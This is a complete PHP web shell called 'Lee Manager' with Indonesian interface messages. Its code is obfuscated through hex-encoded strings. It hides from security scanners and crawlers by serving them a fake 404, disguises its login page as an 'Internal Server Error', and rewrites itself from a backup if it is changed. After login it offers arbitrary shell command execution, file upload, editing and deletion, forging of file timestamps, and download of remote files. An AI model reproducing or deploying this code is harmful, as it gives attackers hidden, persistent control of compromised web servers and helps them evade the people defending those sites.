<?php
class X0x {
    private static $h = [
        'a' => 'session_start',
        'b' => 'error_reporting',
        'c' => 'ini_set',
        'd' => 'display_errors',
        'e' => 'log_errors',
        'f' => ['wpscan','nmap','nikto','acunetix','nessus','burpsuite','python-requests','go-http-client','scrapy','masscan','sqlmap','hydra','openvas','netsparker','appscan','arachni','gobuster','dirbuster','wfuzz','zap','skipfish','whatweb','bot','crawler','spider','imunify','360','sucuri','wordfence','wot','cloudflare','semrush','ahrefs','mj12bot','dotbot','bingbot','googlebot','yandexbot','baidubot','facebookexternalhit','twitterbot'],
        'g' => ['HTTP_USER_AGENT','REMOTE_ADDR','REQUEST_URI','HTTP/1.0 404 Not Found','<h1>404 Not Found</h1>','HTTP/1.0 429 Too Many Requests','/rate_','file_backup','file_md5','recovery','Location: ','user','pass','login','path','delete','rename_from','rename_to','edit_date_file','new_date','new_folder','new_file','upload','uploads','zipfile','unzip_file','save_file','content','url_download','url_filename','cmd']
    ];
    
    public static function g($k) {
        return isset(self::$h[$k]) ? self::$h[$k] : null;
    }
    
    public static function h2s($h) {
        $s = '';
        for ($i=0; $i<strlen($h); $i+=2) {
            $s .= chr(hexdec(substr($h,$i,2)));
        }
        return $s;
    }
}

// Start session
call_user_func(X0x::h2s('73657373696f6e5f7374617274'));

// Error reporting
call_user_func(X0x::h2s('6572726f725f7265706f7274696e67'), 0);
call_user_func(X0x::h2s('696e695f736574'), X0x::h2s('646973706c61795f6572726f7273'), 0);
call_user_func(X0x::h2s('696e695f736574'), X0x::h2s('6c6f675f6572726f7273'), 0);

// Scanner detection
$scanners = X0x::g('f');
$ua = isset($_SERVER[X0x::h2s('485454505f555345525f4147454e54')]) ? $_SERVER[X0x::h2s('485454505f555345525f4147454e54')] : '';

foreach ($scanners as $s) {
    if (stripos($ua, $s) !== false) {
        header(X0x::h2s('485454502f312e3020343034204e6f7420466f756e64'));
        echo X0x::h2s('3c68313e343034204e6f7420466f756e643c2f68313e');
        exit;
    }
}

// GET param validation
foreach ($_GET as $k => $v) {
    if (strlen($k) > 50 || strlen($v) > 500) {
        header(X0x::h2s('485454502f312e3020343034204e6f7420466f756e64'));
        exit;
    }
}

// Rate limiting
$rate_file = sys_get_temp_dir() . X0x::h2s('2f726174655f') . md5($_SERVER[X0x::h2s('52454d4f54455f41444452')]);
if (file_exists($rate_file)) {
    $attempts = (int)file_get_contents($rate_file);
    if ($attempts > 100) {
        header(X0x::h2s('485454502f312e302034323920546f6f204d616e79205265717565737473'));
        exit;
    }
    file_put_contents($rate_file, $attempts + 1);
} else {
    file_put_contents($rate_file, 1);
}

// Cleanup old rate files
if (rand(1, 500) == 1) {
    $files = glob(sys_get_temp_dir() . X0x::h2s('2f726174655f2a'));
    if (count($files) > 100) {
        foreach ($files as $f) {
            if (time() - filemtime($f) > 3600) {
                unlink($f);
            }
        }
    }
}

$current_file = __FILE__;
$current_name = basename($current_file);

// File backup protection
if (!isset($_SESSION[X0x::h2s('66696c655f6261636b7570')])) {
    $_SESSION[X0x::h2s('66696c655f6261636b7570')] = file_get_contents($current_file);
    $_SESSION[X0x::h2s('66696c655f6d6435')] = md5($_SESSION[X0x::h2s('66696c655f6261636b7570')]);
}

@chmod($current_file, 0444);

// Recovery
if (isset($_GET[X0x::h2s('7265636f76657279')])) {
    if (isset($_SESSION[X0x::h2s('66696c655f6261636b7570')])) {
        file_put_contents($current_file, $_SESSION[X0x::h2s('66696c655f6261636b7570')]);
        chmod($current_file, 0444);
    }
    header(X0x::h2s('4c6f636174696f6e3a2020') . strtok($_SERVER[X0x::h2s('524551554553545f555249')], '?'));
    exit;
}

// File integrity check
if (file_exists($current_file)) {
    $current_content = file_get_contents($current_file);
    $current_md5 = md5($current_content);
    
    if ($current_md5 !== $_SESSION[X0x::h2s('66696c655f6d6435')]) {
        file_put_contents($current_file, $_SESSION[X0x::h2s('66696c655f6261636b7570')]);
        chmod($current_file, 0444);
    }
}

$user_hash = X0x::h2s('2432612431322451644f4b4f71354d632e486f2f386a507734795853656d306c67646a2f6d32745a316b3550464b6a7663343564596870756d4c4d75');
$pass_hash = X0x::h2s('2432612431322436504777446a436b5564796d66515a6f596b2e464f4f3050555252373043386a7535394d575a764c496c634d5a4748494937436857');

if (isset($_POST[X0x::h2s('75736572')], $_POST[X0x::h2s('70617373')])) {
    if (password_verify($_POST[X0x::h2s('75736572')], $user_hash) && password_verify($_POST[X0x::h2s('70617373')], $pass_hash)) {
        $_SESSION[X0x::h2s('6c6f67696e')] = true;
        $_SESSION[X0x::h2s('66696c655f6261636b7570')] = file_get_contents($current_file);
        $_SESSION[X0x::h2s('66696c655f6d6435')] = md5($_SESSION[X0x::h2s('66696c655f6261636b7570')]);
        @chmod($current_file, 0644);
    } else {
        $error = X0x::h2s('4c6f67696e20676167616c2c2073616c616821');
        sleep(1);
    }
}

// Set permissions based on login
if (isset($_SESSION[X0x::h2s('6c6f67696e')]) && $_SESSION[X0x::h2s('6c6f67696e')] === true) {
    @chmod($current_file, 0644);
}

// Show login form if not logged in
if (!isset($_SESSION[X0x::h2s('6c6f67696e')]) || $_SESSION[X0x::h2s('6c6f67696e')] !== true) {
    @chmod($current_file, 0444);
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Internal Server Error</title>
<style>
    body{margin:0;font-family:Arial,sans-serif;background:#fff;color:#000;}
    .spacer{height:160vh;}
    form{width:260px;margin:0 0 40px 30px;}
    h2{font-size:16px;font-weight:normal;margin-bottom:10px;}
    input{width:100%;padding:8px;margin-bottom:8px;box-sizing:border-box;}
    button{width:100%;padding:8px;cursor:pointer;}
    .error{color:#c00;font-size:12px;margin-bottom:6px;}
</style>
</head>
<body>
<div class="spacer"></div>
    <form method="post">
        <h2>🔐 Login</h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <input type="text" name="user" placeholder="Username" required>
        <input type="password" name="pass" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
</body>
</html>
<?php
exit;
}

// Get current path
$requested = isset($_GET[X0x::h2s('70617468')]) ? $_GET[X0x::h2s('70617468')] : getcwd();
$path = realpath($requested);
if (!$path || !is_dir($path)) {
    $path = getcwd();
}
$path = str_replace('\\', '/', $path);

// Home path
$home = realpath(dirname(__FILE__));
$home = str_replace('\\', '/', $home);

// File size formatter
function fmt_size($s) {
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

$msg = '';
$msg_type = '';

// Handle file deletion
if (isset($_GET[X0x::h2s('64656c657465')])) {
    $target = realpath($path . '/' . $_GET[X0x::h2s('64656c657465')]);
    if ($target && strpos($target, $path) === 0) {
        if (is_file($target)) {
            if (unlink($target)) {
                $msg = "✅ File berhasil dihapus";
                $msg_type = 'success';
            } else {
                $msg = "❌ Gagal menghapus file";
                $msg_type = 'error';
            }
        } elseif (is_dir($target)) {
            if (rmdir($target)) {
                $msg = "✅ Folder berhasil dihapus";
                $msg_type = 'success';
            } else {
                $msg = "❌ Gagal menghapus folder";
                $msg_type = 'error';
            }
        }
    }
}

// Handle rename
if (isset($_POST[X0x::h2s('72656e616d655f66726f6d')], $_POST[X0x::h2s('72656e616d655f746f')]) && !empty($_POST[X0x::h2s('72656e616d655f746f')])) {
    $from = realpath($path . '/' . $_POST[X0x::h2s('72656e616d655f66726f6d')]);
    $to = $path . '/' . basename($_POST[X0x::h2s('72656e616d655f746f')]);
    if ($from && strpos($from, $path) === 0 && file_exists($from)) {
        if (rename($from, $to)) {
            $msg = "✅ Berhasil rename";
            $msg_type = 'success';
        } else {
            $msg = "❌ Gagal rename";
            $msg_type = 'error';
        }
    }
}

// Handle date modification
if (isset($_POST[X0x::h2s('656469745f646174655f66696c65')], $_POST[X0x::h2s('6e65775f64617465')])) {
    $target = realpath($path . '/' . $_POST[X0x::h2s('656469745f646174655f66696c65')]);
    if ($target && strpos($target, $path) === 0 && file_exists($target)) {
        $timestamp = strtotime($_POST[X0x::h2s('6e65775f64617465')]);
        if ($timestamp !== false) {
            if (touch($target, $timestamp)) {
                $msg = "✅ Tanggal berhasil diubah";
                $msg_type = 'success';
            } else {
                $msg = "❌ Gagal mengubah tanggal";
                $msg_type = 'error';
            }
        }
    }
}

// Handle new folder
if (isset($_POST[X0x::h2s('6e65775f666f6c646572')]) && !empty($_POST[X0x::h2s('6e65775f666f6c646572')])) {
    $newFolder = $path . '/' . basename($_POST[X0x::h2s('6e65775f666f6c646572')]);
    if (!file_exists($newFolder)) {
        if (mkdir($newFolder, 0755, true)) {
            $msg = "✅ Folder berhasil dibuat";
            $msg_type = 'success';
        } else {
            $msg = "❌ Gagal membuat folder";
            $msg_type = 'error';
        }
    } else {
        $msg = "❌ Folder sudah ada";
        $msg_type = 'error';
    }
}

// Handle new file
if (isset($_POST[X0x::h2s('6e65775f66696c65')]) && !empty($_POST[X0x::h2s('6e65775f66696c65')])) {
    $newFile = $path . '/' . basename($_POST[X0x::h2s('6e65775f66696c65')]);
    if (!file_exists($newFile)) {
        if (file_put_contents($newFile, '') !== false) {
            $msg = "✅ File berhasil dibuat";
            $msg_type = 'success';
        } else {
            $msg = "❌ Gagal membuat file";
            $msg_type = 'error';
        }
    } else {
        $msg = "❌ File sudah ada";
        $msg_type = 'error';
    }
}

// Handle file upload
if (isset($_FILES[X0x::h2s('75706c6f6164')])) {
    if ($_FILES[X0x::h2s('75706c6f6164')]['error'] === UPLOAD_ERR_OK) {
        $tmp = $_FILES[X0x::h2s('75706c6f6164')]['tmp_name'];
        $name = basename($_FILES[X0x::h2s('75706c6f6164')]['name']);
        $dest = $path . '/' . $name;
        
        $size = $_FILES[X0x::h2s('75706c6f6164')]['size'];
        $max = 100 * 1024 * 1024;
        
        if ($size > $max) {
            $msg = "❌ File terlalu besar";
            $msg_type = 'error';
        } else {
            if (move_uploaded_file($tmp, $dest)) {
                chmod($dest, 0644);
                $msg = "✅ Upload berhasil: " . htmlspecialchars($name) . " (" . fmt_size($size) . ")";
                $msg_type = 'success';
            } else {
                $msg = "❌ Gagal upload";
                $msg_type = 'error';
            }
        }
    }
}

// Handle save file
if (isset($_POST[X0x::h2s('736176655f66696c65')], $_POST[X0x::h2s('636f6e74656e74')])) {
    $file = realpath($path . '/' . $_POST[X0x::h2s('736176655f66696c65')]);
    if ($file && strpos($file, $path) === 0 && is_file($file)) {
        if (file_put_contents($file, $_POST[X0x::h2s('636f6e74656e74')]) !== false) {
            if (basename($file) == basename(__FILE__)) {
                $_SESSION[X0x::h2s('66696c655f6261636b7570')] = $_POST[X0x::h2s('636f6e74656e74')];
                $_SESSION[X0x::h2s('66696c655f6d6435')] = md5($_POST[X0x::h2s('636f6e74656e74')]);
            }
            $msg = "✅ File berhasil disimpan";
            $msg_type = 'success';
        } else {
            $msg = "❌ Gagal menyimpan file";
            $msg_type = 'error';
        }
    }
}

// Handle URL download
if (isset($_POST[X0x::h2s('75726c5f646f776e6c6f6164')]) && !empty($_POST[X0x::h2s('75726c5f646f776e6c6f6164')])) {
    $url = trim($_POST[X0x::h2s('75726c5f646f776e6c6f6164')]);
    $filename = isset($_POST[X0x::h2s('75726c5f66696c656e616d65')]) && !empty($_POST[X0x::h2s('75726c5f66696c656e616d65')]) ? trim($_POST[X0x::h2s('75726c5f66696c656e616d65')]) : basename(parse_url($url, PHP_URL_PATH));
    
    if (empty($filename) || $filename == '.' || $filename == '/') {
        $filename = md5($url) . '.bin';
    }
    
    $filename = preg_replace('/[^a-zA-Z0-9\.\-_]/', '', $filename);
    if (empty($filename)) $filename = md5($url) . '.bin';
    
    $target = $path . '/' . $filename;
    
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        if (function_exists('curl_init')) {
            $fp = fopen($target, 'w+');
            if ($fp) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_FILE, $fp);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 300);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                
                $success = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $fileSize = curl_getinfo($ch, CURLINFO_SIZE_DOWNLOAD);
                curl_close($ch);
                fclose($fp);
                
                if ($success !== false && $httpCode == 200 && $fileSize > 0) {
                    $msg = "✅ Download berhasil: " . htmlspecialchars($filename) . " (" . fmt_size($fileSize) . ")";
                    $msg_type = 'success';
                } else {
                    @unlink($target);
                    $msg = "❌ Download gagal";
                    $msg_type = 'error';
                }
            }
        } else {
            $msg = "❌ Tidak ada method download";
            $msg_type = 'error';
        }
    } else {
        $msg = "❌ URL tidak valid";
        $msg_type = 'error';
    }
}

// Handle command execution
if (isset($_POST[X0x::h2s('636d64')])) {
    $cmd = trim($_POST[X0x::h2s('636d64')]);
    $output = '';
    
    if (!empty($cmd)) {
        if (function_exists('shell_exec')) {
            $output = shell_exec($cmd . ' 2>&1');
        } elseif (function_exists('exec')) {
            exec($cmd . ' 2>&1', $out, $ret);
            $output = implode("\n", $out);
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd . ' 2>&1', $ret);
            $output = ob_get_clean();
        } else {
            $output = "❌ Tidak ada method execution tersedia";
        }
        
        if (empty($output)) $output = "[Tidak ada output]";
    }
}

// Redirect after actions
if (isset($_GET[X0x::h2s('64656c657465')]) || isset($_POST[X0x::h2s('72656e616d655f66726f6d')]) || isset($_POST[X0x::h2s('656469745f646174655f66696c65')]) || 
    isset($_POST[X0x::h2s('6e65775f666f6c646572')]) || isset($_POST[X0x::h2s('6e65775f66696c65')]) || isset($_FILES[X0x::h2s('75706c6f6164')]) || 
    isset($_POST[X0x::h2s('736176655f66696c65')])) {
    
    $redirect = "?path=" . urlencode($path);
    if (!empty($msg)) {
        $_SESSION['temp_msg'] = $msg;
        $_SESSION['temp_type'] = $msg_type;
    }
    header("Location: " . $redirect);
    exit;
}

if (isset($_SESSION['temp_msg'])) {
    $msg = $_SESSION['temp_msg'];
    $msg_type = $_SESSION['temp_type'];
    unset($_SESSION['temp_msg']);
    unset($_SESSION['temp_type']);
}

// Backup file content
if (file_exists(__FILE__)) {
    $_SESSION[X0x::h2s('66696c655f6261636b7570')] = file_get_contents(__FILE__);
    $_SESSION[X0x::h2s('66696c655f6d6435')] = md5($_SESSION[X0x::h2s('66696c655f6261636b7570')]);
}

// Main UI
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Lee Manager</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Lucida, sans-serif; 
            background: #1a1a1a; 
            color: #e0e0e0; 
            padding: 15px; 
            margin: 0;
        }
        a { color: #4CAF50; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { 
            width: 100%; 
            background: #2d2d2d; 
            border-collapse: collapse; 
            margin: 15px 0; 
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        th, td { 
            padding: 12px; 
            border: 1px solid #404040;
            text-align: left;
        }
        th { 
            background: #1a1a1a; 
            color: #4CAF50;
            font-weight: 600;
        }
        td { color: #e0e0e0; }
        input, button, select, textarea { 
            margin: 5px 0; 
            padding: 8px 12px;
            border: 1px solid #404040;
            border-radius: 4px;
            font-size: 14px;
            background: #333;
            color: #e0e0e0;
        }
        button, .button { 
            background: #4CAF50; 
            color: white; 
            border: none;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
            display: inline-block;
        }
        button:hover, .button:hover { 
            background: #45a049; 
            text-decoration: none;
        }
        textarea { 
            width: 100%; 
            height: 400px; 
            font-family: monospace; 
            background: #1e1e1e; 
            color: #e0e0e0; 
            border: 1px solid #404040;
            padding: 15px;
            border-radius: 4px;
            font-size: 14px;
        }
        .top-bar { 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            background: #2d2d2d;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
        }
        .path-nav {
            background: #2d2d2d;
            padding: 10px 15px;
            border-radius: 4px;
            margin: 10px 0;
            word-break: break-all;
        }
        .success-msg { 
            color: #4CAF50; 
            background: rgba(76,175,80,0.1);
            padding: 12px;
            border-radius: 4px;
            border-left: 4px solid #4CAF50;
            margin: 10px 0;
        }
        .error-msg { 
            color: #f44336; 
            background: rgba(244,67,54,0.1);
            padding: 12px;
            border-radius: 4px;
            border-left: 4px solid #f44336;
            margin: 10px 0;
        }
        .terminal {
            background: #1e1e1e;
            color: #e0e0e0;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            margin-top: 15px;
            overflow-x: auto;
            border: 1px solid #404040;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin: 15px 0;
        }
        .card {
            background: #2d2d2d;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #404040;
        }
        .badge {
            background: #4CAF50;
            color: white;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 11px;
        }
        hr {
            border: none;
            border-top: 1px solid #404040;
            margin: 20px 0;
        }
        .btn-small {
            padding: 4px 8px;
            font-size: 12px;
            margin: 0 2px;
        }
        .path-link {
            color: #4CAF50;
            margin: 0 5px;
        }
        .path-container {
            display: inline-block;
            margin: 0 10px;
        }
        .path-actions {
            float: right;
        }
        .btn-icon {
            margin: 0 5px;
            color: #4CAF50;
        }
    </style>
</head>
<body>

<div class="top-bar">
    <div>
        <h2 style="margin:0; color: #4CAF50;">Lee Manager</h2> 
        <p style="margin:5px 0 0; color: #888;">Secure Access</p>
    </div>
    <div>
        <a href="?recovery=1" class="button" onclick="return confirm('Recover original file?')">Recovery</a>
    </div>
</div>

<div class="path-nav">
    <span class="path-label">📍 Current Path:</span>
    <div class="path-container">
        <?php
        echo '<a href="?path=/" class="path-link">/</a>';
        
        $parts = explode('/', trim($path, '/'));
        $build = '';
        
        foreach ($parts as $part) {
            if ($part === '') continue;
            $build .= '/' . $part;
            
            echo '<a href="?path=' . urlencode($build) . '" class="path-link">' . htmlspecialchars($part) . '/</a>';
        }
        ?>
    </div>
    <div class="path-actions">
        <a href="?path=<?php echo urlencode('/'); ?>" class="btn-icon" title="Root">Root</a>
        <a href="?path=<?php echo urlencode($home); ?>" class="btn-icon" title="Home">Home</a>
        <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="btn-icon" title="Up">↑</a>
    </div>
</div>

<?php if (!empty($msg)): ?>
    <div class="<?php echo $msg_type == 'success' ? 'success-msg' : 'error-msg'; ?>">
        <?php echo $msg; ?>
    </div>
<?php endif; ?>

<table>
    <tr>
        <th>Name</th>
        <th>Size</th>
        <th>Perm</th>
        <th>Modified</th>
        <th>Actions</th>
    </tr>
    <?php
    $items = scandir($path);
    $dirs = [];
    $files = [];

    foreach ($items as $f) {
        if ($f === '.' || $f === '..') continue;
        $full = $path . '/' . $f;
        if (is_dir($full)) $dirs[] = $f; else $files[] = $f;
    }

    natcasesort($dirs);
    natcasesort($files);
    $all = array_merge($dirs, $files);
    
    foreach ($all as $f):
        $full = $path . '/' . $f;
        $is_dir = is_dir($full);
        $perm_num = substr(sprintf('%o', fileperms($full)), -4);
        $mtime = filemtime($full);
        $is_zip = (!$is_dir && strtolower(pathinfo($f, PATHINFO_EXTENSION)) == 'zip');
    ?>
    <tr>
        <td>
            <?php if ($is_dir): ?>
                <span style="color: #4CAF50;">📁</span> 
                <a href="?path=<?php echo urlencode($full); ?>" style="color:#4CAF50;"><?php echo htmlspecialchars($f); ?></a>
            <?php else: ?>
                <span style="color: #888;">📄</span> 
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" style="color:#4CAF50;"><?php echo htmlspecialchars($f); ?></a>
                <?php if ($is_zip): ?>
                    <span class="badge">ZIP</span>
                <?php endif; ?>
            <?php endif; ?>
        </td>
        <td><?php echo $is_dir ? '📁' : fmt_size(filesize($full)); ?></td>
        <td><?php echo $perm_num; ?></td>
        <td>
            <form method="post" style="display:inline;">
                <input type="hidden" name="edit_date_file" value="<?php echo htmlspecialchars($f); ?>">
                <input type="datetime-local" name="new_date" value="<?php echo date('Y-m-d\TH:i', $mtime); ?>" style="width:160px; padding:4px; font-size:12px; background:#333;">
                <button type="submit" class="btn-small">Set</button>
            </form>
        </td>
        <td>
            <form method="post" style="display:inline;">
                <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($f); ?>">
                <input type="text" name="rename_to" value="<?php echo htmlspecialchars($f); ?>" style="width:80px; padding:4px; font-size:12px; background:#333;">
                <button type="submit" class="btn-small">Rename</button>
            </form>
            
            <?php if (!$is_dir): ?>
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" class="button btn-small">Edit</a>
            <?php endif; ?>
            
            <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" class="button btn-small" style="background:#f44336;" onclick="return confirm('Delete <?php echo htmlspecialchars($f); ?>?')">Delete</a>
        </td>
    </tr>
    <?php endforeach; ?>
</table>

<div class="grid">
    <div class="card">
        <h3 style="margin-top:0; color:#4CAF50;">Upload File</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="upload" style="width:100%; background:#333;">
            <button type="submit" style="width:100%;">Upload</button>
        </form>
    </div>
    
    <div class="card">
        <h3 style="margin-top:0; color:#4CAF50;">New Folder</h3>
        <form method="post">
            <input type="text" name="new_folder" placeholder="Folder name" style="width:100%; background:#333;">
            <button type="submit" style="width:100%;">Create</button>
        </form>
    </div>
    
    <div class="card">
        <h3 style="margin-top:0; color:#4CAF50;">New File</h3>
        <form method="post">
            <input type="text" name="new_file" placeholder="file.txt" style="width:100%; background:#333;">
            <button type="submit" style="width:100%;">Create</button>
        </form>
    </div>
    
    <div class="card">
        <h3 style="margin-top:0; color:#4CAF50;">Download URL</h3>
        <form method="post">
            <input type="url" name="url_download" placeholder="https://example.com/file.zip" style="width:100%; background:#333;" required>
            <input type="text" name="url_filename" placeholder="Save as (optional)" style="width:100%; margin-top:5px; background:#333;">
            <button type="submit" style="margin-top:10px; width:100%;">Download</button>
        </form>
    </div>
</div>

<?php
if (isset($_GET['edit'])):
    $edit = realpath($path . '/' . $_GET['edit']);
    if ($edit && strpos($edit, $path) === 0 && is_file($edit)):
        $content = htmlspecialchars(file_get_contents($edit));
?>
<h3 style="color:#4CAF50;">Edit File: <?php echo basename($edit); ?></h3>
<form method="post">
    <textarea name="content"><?php echo $content; ?></textarea>
    <div style="margin-top:10px;">
        <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit)); ?>">
        <button type="submit">Save</button>
        <a href="?path=<?php echo urlencode($path); ?>" class="button">Back</a>
    </div>
</form>
<?php endif; endif; ?>

<hr>
<h3 style="color:#4CAF50;">Terminal</h3>
<form method="post">
    <div style="display:flex; gap:10px; flex-wrap:wrap;">
        <input type="text" name="cmd" style="flex:1; min-width:200px; padding:12px; font-family:monospace; background:#333;" 
               placeholder="Enter command" 
               value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
        <button type="submit" style="padding:12px 25px;">Execute</button>
    </div>
</form>

<?php if (isset($output)): ?>
<div class="terminal">
    <pre style="margin:0; white-space:pre-wrap;"><?php echo htmlspecialchars($output); ?></pre>
</div>
<?php endif; ?>

</body>
</html>
